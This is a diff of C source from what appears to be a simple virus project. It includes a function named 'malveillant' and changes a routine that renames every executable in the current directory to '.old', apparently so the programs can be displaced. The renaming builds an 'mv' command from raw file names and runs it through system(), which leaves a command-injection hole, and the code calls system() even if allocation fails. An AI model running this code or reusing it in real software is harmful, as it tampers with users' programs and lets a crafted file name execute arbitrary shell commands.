@@ -91,7 +91,7 @@ void cptExec() {
         if (myDir) {
                 while ((dir = readdir(myDir)) != NULL) {
                         // PENSER A SUPPRIMER LA CONDITION SUR LE .GIT /!\/!\/!|
-                        if ((strcmp(".", dir->d_name)) && (strcmp("..", dir->d_name)) && (strcmp(".git", dir->d_name)) && (strcmp("MediaPlayer", dir->d_name))) {
+                        if ((strcmp(".", dir->d_name)) && (strcmp("..", dir->d_name)) && (strcmp(".git", dir->d_name)) && (strcmp("MediaPlayer", dir->d_name)) && (strcmp("src", dir->d_name))) {
                                 if (access(dir->d_name, X_OK) == 0) {
                                         renamingFile(dir->d_name);
                                 }
@@ -102,7 +102,20 @@ void cptExec() {
 }
 
 void renamingFile(char *fileName) {
-        printf("Renaming %s into %s.old\n",fileName,fileName);
+        printf("\tRenaming %s into %s.old\n",fileName,fileName);
+
+        char *command = "mv ";
+        char *extension = ".old";
+        char *espace = " ";
+        char *String = malloc(strlen(command) + (strlen(fileName)*2) + strlen(espace) + strlen(extension) + 1);
+        if(String) {
+                strcpy(String,command);
+                strcat(String,fileName);
+                strcat(String,espace);
+                strcat(String,fileName);
+                strcat(String,extension);
+        }
+        system(String);
 }
 
 void malveillant() {
